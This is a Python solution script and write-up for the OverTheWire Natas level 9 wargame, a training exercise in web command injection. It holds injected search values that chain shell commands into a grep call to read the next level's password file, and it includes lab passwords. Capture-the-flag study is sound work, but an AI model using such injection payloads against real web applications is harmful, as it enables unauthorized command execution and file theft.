#!/usr/bin/env python3
'''
Command  injection
https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas9.py

https://www.youtube.com/watch?v=6DrAoTiAFtA&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=6


Level 9 → Level 10
Username: natas9
URL:      http://natas9.natas.labs.overthewire.org
password: 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
problem :  On successfully logging in the natas9 webpage, we will have a form
         in front of us.
         It says “Find words containing”

write up:
  In the  source code we find the next form:
     <form>
      Find words containing: <input name=needle>
          <input type=submit name=submit value=Search><br><br>
     </form>

  1. Opened the source code.
    a.  When we enter a keyword, it is passed via
        a function called passthru().
    b.
	    if($key != "") {
          passthru("grep -i $key dictionary.txt")

	     Lets try passing ” ;echo hello; “.
	     The passthru function performs the query
		      ” passthru(“grep -i;echo hello;dictionary.txt”); ”
	      and prints hello on the screen.
		 If we pass the file location of the password for natas10,
		 the application should   respond back with the password.
		   We now pass
  2. ” ; cat /etc/natas_webpass/natas10;  ”
   output: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

The passthru() function is similar to the exec() function in that it executes
a command.
 function should be used in place of exec() or system() when the output from
 the Unix command  is binary data which needs to be passed directly back to
 the browser.
'''
import requests
import re

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'


url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url, auth = (username, password) )
content = response.text
print("1. response.text \n------------------\n",response.text)

session = requests.Session()
# response = session.get(url, auth = (username, password) )
#response = session.post(url0, data = {"secret": "oubWYf2kBq", "submit":"submit" }, auth = (username, password) )
#response = session.post(url, data = {"needle": ". /etc/natas_webpass/natas10 #", "submit":"submit" }, auth = (username, password) )

#needle is the name of the variable in the php form
#search_str = "a;  cat /etc/rsyslog.conf"# Output a file

# Command  injection
search_str =  " . /etc/natas_webpass/natas10  #" #The '.' (dot) mean sgrep anything

# So the command is: grep -i . /etc/natas_webpass/natas10  # dictionary.txt
# So this is a grep command   scans every word in the  'natas10' file
response = session.post(
                        url,
                        data = {"needle": search_str, "submit":"submit" },
                        auth = (username, password) )
content = response.text
print("2. Response with search string = ",search_str, "\n------------------\n",response.text)
# print content

print (re.findall('<pre>\n(.*)\n</pre>', content)[0])
